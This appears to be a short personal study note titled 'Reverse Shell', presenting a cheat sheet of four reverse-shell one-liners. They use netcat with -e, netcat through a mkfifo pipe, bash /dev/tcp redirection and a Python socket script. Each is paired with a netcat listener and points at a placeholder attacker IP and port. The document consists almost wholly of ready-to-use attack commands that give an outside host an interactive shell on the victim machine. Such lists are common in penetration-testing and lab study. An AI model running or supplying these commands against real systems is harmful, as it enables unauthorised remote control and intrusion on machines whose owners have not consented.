---
title: Reverse Shell
aliases:
  - Reverse Shell
---
## 1. Simple netcat Reverse Shell
---
### Run command

**Attacker's Machine** : `nc -lvnp 4444`
**Victim's Machine** : `nc -e /bin/sh {attackers IP} port`

![[images/Pasted image 20250424100653.png]]

## 2. Netcat without -e
---
Newer linux machine by default has traditional **netcat** with `GAPING_SECURITY_HOLE` disabled, it means you **don’t have the -e** option of netcat.

> In this case,

### Run Command

**Attacker's Machine** : `nc -lvnp 4444`
**Victim's Machine** : `mkfifo /tmp/p; nc {attackers IP} <port> 0</tmp/p | /bin/sh > /tmp/p 2>&1; rm /tmp/p`

![[images/Pasted image 20250424101401.png]]

## 3. Bash
---
### Run Command

**Attacker's Machine** : `nc -lvnp 4444`
**Victim's Machine** : `bash -c 'sh -i >& /dev/tcp/<Attacker's IP>/<port> 0>&1'`

![[images/Pasted image 20250424101632.png]]

## 4. Python
---
### Run Command

**Attacker's Machine** : `nc -lvnp 4444`
**Victim's Machine** : 
`python -c 'import socket, subprocess, os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("<Attacker's IP>",<PORT>)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'`

![[images/Pasted image 20250424120632.png]]